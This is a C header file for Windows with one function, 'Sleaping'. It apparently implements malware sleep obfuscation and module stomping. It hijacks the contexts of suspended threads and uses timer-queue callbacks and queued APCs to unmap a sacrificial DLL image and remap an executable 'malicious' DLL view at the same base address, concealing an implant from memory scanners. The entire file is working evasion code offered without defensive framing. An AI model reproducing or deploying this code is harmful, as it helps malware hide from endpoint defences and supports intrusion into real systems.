#pragma once

#include <Windows.h>
#include "headers.h"


/*-----------------------------------------------------------*/

int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_T viewSize, PNT_FUNCTIONS ntFunctions, PVOID NtTestAlertAddress) {

    
    HANDLE DummyEvent = { 0 };
    
    //sleaping threads = 5 Timers + 6 APC threads
    HANDLE ThreadArray[4] = { NULL };

    //timers variables
    HANDLE  hTimerQueue = NULL;
    HANDLE  hNewTimer = NULL;

    //i create the sync event that would trigger the first thread 

    if (!NT_SUCCESS(ntFunctions->NtCreateEvent(&DummyEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE))) {
        return -1;
    }

	
    //variables and logic for SLEAPING timers
    CONTEXT* context = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* contextB = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* contextC = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* contextD = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));


    if (context == NULL || contextB == NULL || contextC == NULL  || contextD == NULL) {
        return -1;
    }

    context->ContextFlags = CONTEXT_ALL;
    contextB->ContextFlags = CONTEXT_ALL;
    contextC->ContextFlags = CONTEXT_ALL;
    contextD->ContextFlags = CONTEXT_ALL;
    
    ThreadArray[2] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WaitForSingleObjectEx, NULL, CREATE_SUSPENDED, NULL);
    if (ThreadArray[2] == NULL) {

        return -1;
    }

	if (!GetThreadContext(ThreadArray[2], contextC)) {
		return -1;
	}

    *(ULONG_PTR*)((*contextC).Rsp) = (DWORD64)NtTestAlertAddress;
    (*contextC).Rip = (DWORD64)WaitForSingleObjectEx;
    (*contextC).Rcx = (DWORD64)(DummyEvent);
    (*contextC).Rdx = (DWORD64)21000;
    (*contextC).R8 = FALSE;

    if (!SetThreadContext(ThreadArray[2], contextC)) {
        return -1;
    }//wait + APCs 
    //resume the thread that is going to wait the sleep time and then execute the APCs 
    if (!ResumeThread(ThreadArray[2])) {
        return -1;
    }


    // Create a thread to control
    ThreadArray[0] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UnmapViewOfFile, NULL, CREATE_SUSPENDED, NULL);
    if (ThreadArray[0] == NULL) {

        return -1;
    }
    ThreadArray[1] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, NULL);
    if (ThreadArray[1] == NULL) {

        return -1;
    }
    ThreadArray[3] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, NULL);
    if (ThreadArray[3] == NULL) {

        return -1;
    }


    if(!GetThreadContext(ThreadArray[0], context))
		return -1;
    if(!GetThreadContext(ThreadArray[1], contextB))
		return -1;
	if(!GetThreadContext(ThreadArray[3], contextD))
		return -1;

     
    //timer triggered
    *(ULONG_PTR*)((*context).Rsp) = (DWORD64)ExitThread;
    (*context).Rip = (DWORD64)UnmapViewOfFile;
    (*context).Rcx = (DWORD64)(ImageBaseDLL);

    *(ULONG_PTR*)((*contextB).Rsp) = (DWORD64)ExitThread;
    (*contextB).Rip = (DWORD64)MapViewOfFileEx;
    (*contextB).Rcx = (DWORD64)sacDllHandle;
    (*contextB).Rdx = FILE_MAP_ALL_ACCESS;
    (*contextB).R8 = (DWORD64)0x00;
    (*contextB).R9 = (DWORD64)0x00;
    *(ULONG_PTR*)((*contextB).Rsp + 40) = 0x00; //the offset must be either hex 28 or int 40
    *(ULONG_PTR*)((*contextB).Rsp + 48) = (ULONG_PTR)ImageBaseDLL;

    //apc triggered 
    *(ULONG_PTR*)((*contextD).Rsp) = (DWORD64)ExitThread;
    (*contextD).Rip = (DWORD64)MapViewOfFileEx;
    (*contextD).Rcx = (DWORD64)malDllHandle;
    (*contextD).Rdx = FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE;
    (*contextD).R8 = (DWORD64)0x00;
    (*contextD).R9 = (DWORD64)0x00;
    *(ULONG_PTR*)((*contextD).Rsp + 40) = 0x00; //the offset must be either hex 28 or int 40
    *(ULONG_PTR*)((*contextD).Rsp + 48) = (ULONG_PTR)ImageBaseDLL;

	if (!SetThreadContext(ThreadArray[0], context))
		return -1;
	if (!SetThreadContext(ThreadArray[1], contextB))
		return -1;
	if (!SetThreadContext(ThreadArray[3], contextD))
		return -1;

    
    //create the timer queue
    hTimerQueue = CreateTimerQueue();
    if (hTimerQueue == NULL) {
        return -1;
    }

    //queue the APC threads to the worker thread
    
    if (!NT_SUCCESS(ntFunctions->NtQueueApcThread(ThreadArray[2], (PPS_APC_ROUTINE)UnmapViewOfFile, ImageBaseDLL, FALSE, NULL))) {
            return -1;
    }
	if (!NT_SUCCESS(ntFunctions->NtQueueApcThread(ThreadArray[2], (PPS_APC_ROUTINE)ResumeThread, ThreadArray[3], FALSE, NULL))) {
		return -1;
	}

    //queueing an extra APC for exiting the main thread
    if (!NT_SUCCESS(ntFunctions->NtQueueApcThread(ThreadArray[2], (PPS_APC_ROUTINE)ExitThread, NULL, FALSE, NULL))) {
        return -1;
    }
    
	

    if (!CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThread, ThreadArray[0], 200, 0, WT_EXECUTEINTIMERTHREAD)) {
		return -1;
	}//unmap
    
	if (!CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThread, ThreadArray[1], 300, 0, WT_EXECUTEINTIMERTHREAD)) {
		return -1;
	}//mapex
		
    
	
	//wait for all the threads to finish
    if (WaitForMultipleObjects(4, ThreadArray, TRUE, INFINITE) == WAIT_FAILED) {
        return -1;
    }

    //good morning
	if (hNewTimer != NULL) {
		if (DeleteTimerQueueTimer(hTimerQueue, hNewTimer, NULL) == 0) {
			return -1;
		}
	}

    if (DeleteTimerQueue(hTimerQueue) == 0) {

        return -1;
    }

    //clean up totale
    if (context) VirtualFree(context, 0, MEM_RELEASE);
    if (contextB) VirtualFree(contextB, 0, MEM_RELEASE);
    if (contextC) VirtualFree(contextC, 0, MEM_RELEASE);
    if (contextD) VirtualFree(contextD, 0, MEM_RELEASE);
    if (DummyEvent) CloseHandle(DummyEvent);


    return 0;

}